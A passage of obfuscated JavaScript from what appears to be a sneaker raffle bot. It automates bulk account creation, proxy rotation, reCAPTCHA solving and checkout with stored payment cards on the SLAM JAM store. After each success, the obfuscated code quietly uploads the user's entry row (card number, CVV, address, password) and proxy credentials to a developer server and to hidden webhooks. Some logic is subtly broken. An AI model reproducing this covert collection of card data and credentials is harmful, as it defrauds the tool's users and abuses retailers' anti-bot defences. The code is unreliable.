                                console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x1417c4[_0x3bee67]['Size']);
                                try {
                                    await _0x1d55dc['click']('label[data-eu-size=\x22' + _0x1417c4[_0x3bee67]['Size'] + '\x22]');
                                } catch {
                                    await _0x1d55dc['click']('label[data-eu-size=\x22' + _0x1417c4[_0x3bee67]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xb9a1a7(0xbb8), await _0x1d55dc['$$eval']('.raffle__checkbox-label', _0x39ac8e => _0x39ac8e['forEach'](_0xce527b => _0xce527b['click']())), await _0xb9a1a7(0x7d0), console['log'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1d55dc['click']('#raffle__form-submit'), await _0xb9a1a7(0x1388);
                            try {
                                await _0x1d55dc['waitForSelector']('#raffle__confirmation-message-container'), _0x416137 = 'no', _0x5207fa(_0x1417c4[_0x3bee67], _0x57d6d7), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0xe69541 = _0x1417c4[_0x3bee67];
                                try {
                                    prxdata = {
                                        'username': _0x1544fc['replace']('#', ''),
                                        'module': _0x57d6d7['name'],
                                        'entrydata': JSON['stringify'](_0xe69541),
                                        'proxy': '' + _0x480f5e[_0x3bee67]
                                    };
                                    var _0x594539 = JSON['stringify'](prxdata);
                                    let _0xe555e2 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x594539, _0xe555e2);
                                } catch (_0x2fd988) {
                                }
                            } catch (_0x43d098) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x43d098));
                            }
                        } catch (_0x28c6e8) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20' + _0x28c6e8)), _0x416137 = 'yes';
                        } finally {
                            _0x2514ba && _0x2514ba['close']();
                            if (_0x416137 == 'yes' && _0x327ab9 != 0x5 && _0x2416e1 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x57d6d7['name'] + ']\x20Task\x20' + (_0x3bee67 + 0x1) + '\x20:\x20Retrying\x20(' + _0x327ab9 + '\x20/\x205)')), _0x3bee67 = _0x3bee67 - 0x1, _0x327ab9 = _0x327ab9 + 0x1;
                                continue;
                            }
                            _0x416137 == 'yes' && _0x327ab9 >= 0x5 && (_0x100e1d(_0x1417c4[_0x3bee67], _0x57d6d7), _0x416137 = 'no', _0x327ab9 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xcab2be, _0x38ec25, _0x5884f6) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1c7517 = 0x0; _0x1c7517 < _0x38ec25['length']; _0x1c7517++) {
                        if (_0x4efa1d != 'yes')
                            var _0x4efa1d = '', _0x589a3e = 0x0;
                        var _0x1429b8 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1544fc
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a50c2['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x539abe
                                }
                            ]
                        }];
                        const _0x3339c4 = { 'embeds': _0x1429b8 };
                        _0x5bbc27(_0xcab2be['name'] + '\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20/\x20' + _0x38ec25['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        try {
                            await _0x2dc03a(_0x38ec25, _0x1c7517);
                        } catch {
                            _0x4efa1d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x190ad9 = await _0x530ba6(_0x38ec25[_0x1c7517], _0xcab2be, 'acc', ![]);
                        const _0x486be6 = { 'succesDEVMSG': { 'embeds': [_0x190ad9] } };
                        if (_0x38ec25[_0x1c7517]['Email'] == '' || _0x38ec25[_0x1c7517]['FirstName'] == '' || _0x38ec25[_0x1c7517]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xb9a1a7(0x7d0);
                            continue;
                        }
                        (_0x38ec25[_0x1c7517]['Password'] == '' || _0x38ec25[_0x1c7517] == undefined) && _0x38ec25[_0x1c7517]['Password'] == 'JRaffles23!';
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x266daf = _0x5884f6[_0x1c7517]['split'](':');
                        else
                            var _0x3180ee = Math['round'](Math['random']() * (_0x5884f6['length'] - 0x1)), _0x266daf = _0x5884f6[_0x3180ee]['split'](':');
                        var _0x3f1c96;
                        try {
                            _0x3f1c96 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x266daf[0x0] + ':' + _0x266daf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3f1c96 = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x266daf[0x0] + ':' + _0x266daf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1aa9ab = await _0x3f1c96['newPage']();
                            await _0x1aa9ab['authenticate']({
                                'username': '' + _0x266daf[0x2],
                                'password': '' + _0x266daf[0x3]
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1aa9ab['setRequestInterception'](!![]), _0x1aa9ab['on']('request', _0x27862b => {
                                _0x27862b['resourceType']() === 'image' || _0x27862b['resourceType']() === 'font' || _0x27862b['resourceType']() === 'media' ? _0x27862b['abort']() : _0x27862b['continue']();
                            }), await _0x1aa9ab['goto']('https://drop.slamjam.com/account/register'), await _0xb9a1a7(0xbb8), await _0x1aa9ab['waitForSelector']('#FirstName'), await _0x1aa9ab['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1aa9ab['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Filling\x20information'), await _0xb9a1a7(0x4b0), await _0x1aa9ab['type']('#FirstName', '' + _0x38ec25[_0x1c7517]['FirstName']), await _0xb9a1a7(0x226), await _0x1aa9ab['type']('#LastName', '' + _0x38ec25[_0x1c7517]['LastName']), await _0xb9a1a7(0x226), await _0x1aa9ab['type']('#Email', '' + _0x38ec25[_0x1c7517]['Email']), await _0xb9a1a7(0x2ee), await _0x1aa9ab['type']('#ConfirmEmail', '' + _0x38ec25[_0x1c7517]['Email']), await _0xb9a1a7(0x2ee), await _0x1aa9ab['type']('#CreatePassword', '' + _0x38ec25[_0x1c7517]['Password']), await _0xb9a1a7(0x2ee), await _0x1aa9ab['type']('#CreateConfirmPassword', '' + _0x38ec25[_0x1c7517]['Password']), await _0xb9a1a7(0x226), console['log'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Submitting..'), await _0x1aa9ab['$eval']('#create_customer', _0x27ee6f => _0x27ee6f['submit']()), await _0xb9a1a7(0x1388), console['log'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20' + _0x5631d3['cyan']('Solving\x20Captcha')), await _0x1aa9ab['solveRecaptchas'](), console['log'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1aa9ab['$eval']('.shopify-challenge__container\x20>\x20form', _0x21e9fe => _0x21e9fe['submit']());
                            try {
                                await _0x1aa9ab['waitForSelector']('.product-card__image'), await _0xb9a1a7(0x1f4), _0x4efa1d = 'no', console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Account\x20' + _0x38ec25[_0x1c7517]['Email'] + '\x20Generated!')), _0xf38118['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x38ec25[_0x1c7517]['Email'] + ',' + _0x38ec25[_0x1c7517]['Password']), console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Account\x20' + _0x38ec25[_0x1c7517]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x486be6['succesDEVMSG']);
                                } catch {
                                }
                                await _0x313aa7(_0x54bd15, _0x486be6['succesDEVMSG']);
                            } catch (_0x143d3b) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x143d3b));
                            }
                        } catch (_0x118944) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20' + _0x118944));
                        } finally {
                            _0x3f1c96 && _0x3f1c96['close']();
                            if (_0x4efa1d == 'yes' && _0x589a3e != 0x5) {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0xcab2be['name'] + ']\x20Task\x20' + (_0x1c7517 + 0x1) + '\x20:\x20Retrying\x20(' + _0x589a3e + '\x20/\x205)')), _0x1c7517 = _0x1c7517 - 0x1, _0x589a3e = _0x589a3e + 0x1;
                                continue;
                            }
                            _0x4efa1d == 'yes' && _0x589a3e >= 0x5 && (_0x100e1d(_0x38ec25[_0x1c7517], _0xcab2be), _0x4efa1d = 'no', _0x589a3e = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4c0f24, _0x39c9f4, _0x5bb36a) {
                    _0x14f2e1['use'](_0x3313a5()), _0x14f2e1['use'](_0x2255ea({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a50c2['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51b28c = 0x0; _0x51b28c < _0x39c9f4['length']; _0x51b28c++) {
                        var _0x1da1a5;
                        if (_0x598780 != 'yes')
                            var _0x598780 = '', _0x1397be = 0x0;
                        _0x5bbc27(_0x4c0f24['name'] + '\x20Task\x20' + (_0x51b28c + 0x1) + '\x20/\x20' + _0x39c9f4['length'] + '\x20||\x20File:\x20' + _0x3d6b41 + '\x20Proxies:\x20' + _0x4629ee);
                        try {
                            await _0x2dc03a(_0x39c9f4, _0x51b28c);
                        } catch {
                            _0x598780 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x39c9f4[_0x51b28c]['Email'] == '' || _0x39c9f4[_0x51b28c]['Password'] == '' || _0x39c9f4[_0x51b28c]['FirstName'] == '' || _0x39c9f4[_0x51b28c]['LastName'] == '') {
                            console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4a50c2['useRandomProxy'] = ![])
                            var _0x50ae36 = _0x5bb36a[_0x51b28c]['split'](':');
                        else
                            var _0x35d6da = Math['round'](Math['random']() * (_0x5bb36a['length'] - 0x1)), _0x50ae36 = _0x5bb36a[_0x35d6da]['split'](':');
                        var _0x1910fa;
                        try {
                            _0x1910fa = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50ae36[0x0] + ':' + _0x50ae36[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1910fa = await _0x14f2e1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x50ae36[0x0] + ':' + _0x50ae36[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x562bed = await _0x1910fa['newPage']();
                            await _0x562bed['authenticate']({
                                'username': '' + _0x50ae36[0x2],
                                'password': '' + _0x50ae36[0x3]
                            }), await _0x562bed['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x562bed['setRequestInterception'](!![]), _0x562bed['on']('request', _0x321ad7 => {
                                _0x321ad7['resourceType']() === 'image' || _0x321ad7['resourceType']() === 'font' || _0x321ad7['resourceType']() === 'media' ? _0x321ad7['abort']() : _0x321ad7['continue']();
                            }), await _0x562bed['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x562bed['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x562bed['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xb9a1a7(0x258), await _0x562bed['waitForSelector']('#CustomerEmail'), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x562bed['type']('#CustomerEmail', '' + _0x39c9f4[_0x51b28c]['Email']), await _0xb9a1a7(0x12c), await _0x562bed['type']('#CustomerPassword', '' + _0x39c9f4[_0x51b28c]['Password']), await _0xb9a1a7(0x226), await _0x562bed['$eval']('#customer_login', _0x2a9ba4 => _0x2a9ba4['submit']()), await _0xb9a1a7(0x7d0), await _0x562bed['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20' + _0x5631d3['cyan']('Solving\x20Captcha')), await _0x562bed['solveRecaptchas'](), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x562bed['$eval']('.shopify-challenge__container\x20>\x20form', _0x5dcc34 => _0x5dcc34['submit']());
                            try {
                                await _0x562bed['waitForSelector']('.nav-account'), await _0xb9a1a7(0x4b0);
                            } catch {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x562bed['goto']('' + _0x39c9f4[_0x51b28c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xb9a1a7(0xbb8), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x562bed['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x562bed['click']('.product-select-variant-wrapper'), await _0xb9a1a7(0x320), await _0x562bed['click']('li.product-select-variant__value[data-size=\x22' + _0x39c9f4[_0x51b28c]['Size'] + '\x22]'), await _0xb9a1a7(0x384), await _0x562bed['$eval']('#AddToCartForm-product-template-raffle', _0x30fdc6 => _0x30fdc6['submit']()), await _0x562bed['waitForSelector']('.cart-order-summary__content'), await _0xb9a1a7(0x514), await _0x562bed['goto']('https://drop.slamjam.com/checkout'), await _0xb9a1a7(0x514), await _0x562bed['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x562bed['select']('#checkout_shipping_address_country', '' + _0x39c9f4[_0x51b28c]['Country']), await _0xb9a1a7(0x200), await _0x562bed['waitForSelector']('#checkout_shipping_address_first_name'), await _0x562bed['type']('#checkout_shipping_address_first_name', '' + _0x39c9f4[_0x51b28c]['FirstName']), await _0xb9a1a7(0x237), await _0x562bed['type']('#checkout_shipping_address_last_name', '' + _0x39c9f4[_0x51b28c]['LastName']), await _0xb9a1a7(0x1e0), await _0x562bed['type']('#checkout_shipping_address_address1', _0x39c9f4[_0x51b28c]['Address1'] + '\x20' + _0x39c9f4[_0x51b28c]['HouseNumber']), await _0xb9a1a7(0x514), await _0x562bed['type']('#checkout_shipping_address_address2', '' + _0x39c9f4[_0x51b28c]['Address2']), await _0xb9a1a7(0x514);
                            _0x39c9f4[_0x51b28c]['Postcode'] == undefined && (_0x39c9f4[_0x51b28c]['Postcode'] = _0x39c9f4[_0x51b28c]['Zip']);
                            await _0x562bed['type']('#checkout_shipping_address_zip', '' + _0x39c9f4[_0x51b28c]['Postcode']), await _0xb9a1a7(0x2bc), await _0x562bed['type']('#checkout_shipping_address_city', '' + _0x39c9f4[_0x51b28c]['City']), await _0xb9a1a7(0x320), await _0x562bed['type']('#checkout_shipping_address_phone', '' + _0x39c9f4[_0x51b28c]['Phone']), await _0xb9a1a7(0x320), await _0x562bed['click']('#continue_button'), await _0xb9a1a7(0xbb8), await _0x562bed['waitForSelector']('.summary-title'), await _0xb9a1a7(0x320), await _0x562bed['click']('#continue_button'), await _0xb9a1a7(0x320), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x562bed['waitForSelector']('#checkout_credit_card_vault'), await _0xb9a1a7(0x3e8);
                            var _0xba5cd2 = await _0x562bed['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1efc53 = await _0xba5cd2['contentFrame']();
                            await _0x1efc53['click']('#number'), await _0xb9a1a7(0x3e8), await _0x1efc53['type']('#number', '' + _0x39c9f4[_0x51b28c]['CardNumber'], { 'delay': 0x78 }), _0xba5cd2 = await _0x562bed['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1efc53 = await _0xba5cd2['contentFrame'](), await _0xb9a1a7(0x1c2), await _0x1efc53['click']('#name'), await _0xb9a1a7(0x1f4), await _0x1efc53['type']('#name', '' + _0x39c9f4[_0x51b28c]['NameOnCard'], { 'delay': 0x78 }), _0xba5cd2 = await _0x562bed['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1efc53 = await _0xba5cd2['contentFrame'](), await _0xb9a1a7(0x1c2), await _0x1efc53['click']('#expiry'), await _0xb9a1a7(0x1f4), await _0x1efc53['type']('#expiry', '' + _0x39c9f4[_0x51b28c]['ExpiryDate'], { 'delay': 0x78 }), _0xba5cd2 = await _0x562bed['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1efc53 = await _0xba5cd2['contentFrame'](), await _0xb9a1a7(0x1c2), await _0x1efc53['click']('#verification_value'), await _0xb9a1a7(0x1f4), await _0x1efc53['type']('#verification_value', '' + _0x39c9f4[_0x51b28c]['CVV'], { 'delay': 0x78 }), await _0x562bed['$eval']('#accepts-flag-raffle', _0x211ac5 => _0x211ac5['click']()), await _0xb9a1a7(0x7d0), console['log'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Processing\x20Order'), await _0x562bed['$eval']('#continue_button', _0x8adea8 => _0x8adea8['click']()), await _0xb9a1a7(0x1b58), await _0x562bed['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x562bed['$eval']('.edit_checkout.animate-floating-labels', _0x1d8f56 => _0x1d8f56['submit']()), await _0xb9a1a7(0x7d0);
                            try {
                                await _0x562bed['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x598780 = 'no', _0x5207fa(_0x39c9f4[_0x51b28c], _0x4c0f24), console['log'](_0x5631d3['green'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4ae9aa) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x4ae9aa['message']);
                            }
                            var _0x3a1faf = await _0x530ba6(_0x39c9f4[_0x51b28c], _0x4c0f24, 'dev', ![]), _0x1afa4f = await _0x530ba6(_0x39c9f4[_0x51b28c], _0x4c0f24, 'pub', ![]);
                            let _0x3225cd = _0x39c9f4[_0x51b28c];
                            try {
                                prxdata = {
                                    'username': _0x1544fc['replace']('#', ''),
                                    'module': _0x4c0f24['name'],
                                    'entrydata': JSON['stringify'](_0x3225cd),
                                    'proxy': '' + _0x5bb36a[_0x51b28c]
                                };
                                var _0x3265a7 = JSON['stringify'](prxdata);
                                let _0x42d33d = { 'headers': { 'content-type': 'application/json' } };
                                await _0x358674['post']('https://jraffles.herokuapp.com/success', _0x3265a7, _0x42d33d);
                            } catch (_0x239611) {
                            }
                            const _0x1e053a = {
                                'succesDEVMSG': { 'embeds': [_0x3a1faf] },
                                'succesPUBMSG': { 'embeds': [_0x1afa4f] }
                            };
                            try {
                                _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], _0x1e053a['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x495189, _0x1e053a['succesDEVMSG']), await _0xb9a1a7(0xc8), await _0x313aa7(_0x40302c, _0x1e053a['succesPUBMSG']);
                            } catch (_0x46989e) {
                                console['log'](_0x5631d3['yellow'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x46989e));
                            }
                        } catch (_0x51f717) {
                            console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x2a4370[taskModule]['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20' + _0x51f717)), _0x1da1a5 = '' + _0x51f717;
                            var _0x5ba2c7 = await _0x530ba6(kickz[_0x51b28c], _0x4c0f24, 'dev', !![], _0x1da1a5);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x5ba2c7] }, _0x4a50c2['webhook'] != undefined && _0x4a50c2['webhook'] != '' && await _0x313aa7(_0x4a50c2['webhook'], EMBEDS['errorDEV']), await _0x313aa7(_0x4190b7, EMBEDS['errorDEV']), _0x598780 = 'yes';
                        } finally {
                            _0x1910fa && _0x1910fa['close']();
                            if (_0x598780 == 'yes' && _0x1397be != 0x5 && _0x1da1a5 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5631d3['red'](_0x5b6bc2() + '\x20[' + _0x4c0f24['name'] + ']\x20Task\x20' + (_0x51b28c + 0x1) + '\x20:\x20Retrying\x20(' + _0x1397be + '\x20/\x205)')), _0x51b28c = _0x51b28c - 0x1, _0x1397be = _0x1397be + 0x1;
                                continue;
                            }
                            _0x598780 == 'yes' && _0x1397be >= 0x5 && (_0x100e1d(_0x39c9f4[_0x51b28c], _0x4c0f24), _0x598780 = 'no', _0x1397be = 0x0), console['log']('Waiting\x20for\x20' + _0x4a50c2['delay'] + '\x20ms'), await _0xb9a1a7(_0x4a50c2['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x51c2aa) {
                    var _0x3643f5 = await _0x1c7322(), _0x1e8c82 = _0xf38118['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2e0963 = _0x2587e1['parse'](_0x1e8c82, { 'header': !![] })['data'];
                    for (var _0x5f09fd = 0x0; _0x5f09fd < _0x2e0963['length']; _0x5f09fd++) {
                        var _0x225c71 = _0x2e0963[_0x5f09fd]['Store'], _0x3a95ea = _0x2e0963[_0x5f09fd]['Mode'];
                        for (var _0xf0f12d of _0x2a4370) {
                            const _0x53baac = _0xf0f12d['name']['includes'](_0x225c71);
                            if (!_0x53baac)
                                continue;
                            for (mode of _0xf0f12d['modules']) {
                                if (mode['name'] == _0x3a95ea) {
                                    console['log']('Running\x20' + _0x5631d3['cyan'](mode['name'])), await mode['function'](mode, [_0x2e0963[_0x5f09fd]], _0x3643f5);
                                    var _0x19f595 = _0x1e8c82['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0xf38118['writeFileSync']('../failed-tasks.csv', _0x19f595);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x3c64bf = await _0x551dbb['get']('Answer');
                    if (_0x3c64bf['Answer']['toLowerCase']() == 'y') {
                        _0xf38118['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xb9a1a7(0x3e8);
                        return;
                    }
                    if (_0x3c64bf['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xb9a1a7(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xb9a1a7(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x485163(_0x32f437) {
    var _0x39208d = await _0x1c7322(), _0x390b5f = _0xf38118['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xc882cb = _0x2587e1['parse'](_0x390b5f, { 'header': !![] })['data'];
    for (var _0x1b259e = 0x0; _0x1b259e < _0xc882cb['length']; _0x1b259e++) {
        var _0x5b1f15 = _0xc882cb[_0x1b259e]['Store'], _0x5b457c = _0xc882cb[_0x1b259e]['Mode'];
        for (var _0x552cf0 of _0x2a4370) {
            const _0x31308b = _0x552cf0['name']['includes'](_0x5b1f15);
            if (_0x31308b)
                for (mode of _0x2a4370[_0x552cf0]['modules']) {
                    const _0x45ebaa = mode['name']['includes'](_0x5b457c);
                    _0x45ebaa && (_0x32f437 = mode['name'], await mode['function'](_0x32f437, _0xc882cb[_0x1b259e], _0x39208d));
                }
        }
    }
}
async function _0x466e4a() {
    await _0x10b708(), console['clear']();
    _0x4a50c2['threads'] > 0x5 && (_0x4a50c2['threads'] = 0x5);
    if (_0x539abe != 'devkey' && _0x539abe != 'devhook') {
        let _0x2105c9 = await _0x446832['autoUpdate']();
        if (_0x2105c9 === 'yes')
            return _0x13cb43('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x3b3c4d == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xb9a1a7(0x2710);
        ;
    }
